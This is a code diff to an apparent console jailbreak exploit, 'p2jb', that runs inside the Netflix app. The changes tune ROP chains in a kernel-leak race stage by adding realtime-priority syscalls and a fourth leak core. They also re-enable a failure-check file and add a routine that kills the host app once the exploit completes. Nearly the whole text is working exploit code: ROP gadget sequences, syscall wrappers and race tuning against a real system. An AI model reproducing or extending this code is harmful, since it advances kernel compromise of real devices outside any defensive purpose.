@@ -193,7 +193,7 @@
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
 
-        const LEAK_CORES = [0, 1, 2];
+        const LEAK_CORES = [0, 1, 2, 3];
         const LEAK_SYSCALLS = 0x100000001n;
         const LEAK_FD_MAX = 8192n
         const LEAK_SYSCALLS_FINAL = 0xFEDn;
@@ -377,7 +377,7 @@
             return tid;
         }
 
-        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder, rt_prio) {
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
@@ -412,6 +412,13 @@
             emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
             emit(ROP.pop_rcx); emit(0x10n);
             emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
+            emit(ROP.pop_rdi); emit(RTP_SET);
+            emit(ROP.pop_rsi); emit(0n);
+            emit(ROP.pop_rdx); emit(rt_prio);
             emit(syscall_wrapper);
             emit(ROP.ret);
             const LOOP_START = idx;
@@ -481,7 +488,7 @@
             return { buf, entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
         }
 
-        function build_kqueueex_final_chain(count, core, finished_addr) {
+        function build_kqueueex_final_chain(count, core, finished_addr, rt_prio) {
             const POC_ARG = 0x800000000000n;
             const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;
 
@@ -510,6 +517,13 @@
             emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
             emit(ROP.pop_rcx); emit(0x10n);
             emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
+            emit(ROP.pop_rdi); emit(RTP_SET);
+            emit(ROP.pop_rsi); emit(0n);
+            emit(ROP.pop_rdx); emit(rt_prio);
             emit(syscall_wrapper);
             emit(ROP.ret);
 
@@ -1069,6 +1083,11 @@
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
             const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
             const lws = [];
+
+            const rt_prio = malloc(4);
+            write16_uncompressed(rt_prio, PRI_REALTIME);
+            write16_uncompressed(rt_prio + 2n, 256n);
+
             for (let w = 0; w < NW; w++) {
                 const target_w = base_share + (w === 0 ? extra0 : 0n);
                 const bplus1_w = target_w / U;
@@ -1082,7 +1101,7 @@
                 const dummybuf = malloc(8);
                 const chain = build_leak_worker_chain(
                     LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
-                    Number(remainder_w));
+                    Number(remainder_w), rt_prio);
                 spawn_leak_worker(chain.entry);
                 lws.push({
                     chain, rfd, wfd, wfd_big: BigInt(wfd),
@@ -1091,7 +1110,7 @@
                 });
             }
             const final_chain_done_ptr = malloc(8);
-            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr);
+            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
 
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             const _sleep_ts = malloc(16);
@@ -2088,6 +2107,14 @@
             }
         }
 
+        function post_jb_kill_self(S) {
+            logger.log("killing Netflix app, bye now...");
+            send_notification("killing Netflix app, bye now...");
+            nanosleep_ms(500);
+            const pid = syscall(SYSCALL.getpid);
+            syscall(SYSCALL.kill, pid, 9n);
+        }
+
         send_notification(p2jb_version);
 
         try {
@@ -2096,12 +2123,12 @@
                 return;
             }
 
-            // failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
-            // if (file_exists(failcheck_path)) {
-            //     logger.log("aborting, failcheck path exists: " + failcheck_path);
-            //     return;
-            // }
-            // write_file(failcheck_path, "");
+            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
+            if (file_exists(failcheck_path)) {
+                logger.log("aborting, failcheck path exists: " + failcheck_path);
+                return;
+            }
+            write_file(failcheck_path, "");
         } catch (_) { failcheck_path = null; }
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
@@ -2166,6 +2193,9 @@
         post_jb_null_master_pipe(S);
 
         logger.log("=== p2jb complete ===");
+        send_notification("p2jb complete");
+
+        post_jb_kill_self(S);
     } catch (e) {
         try { logger.log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
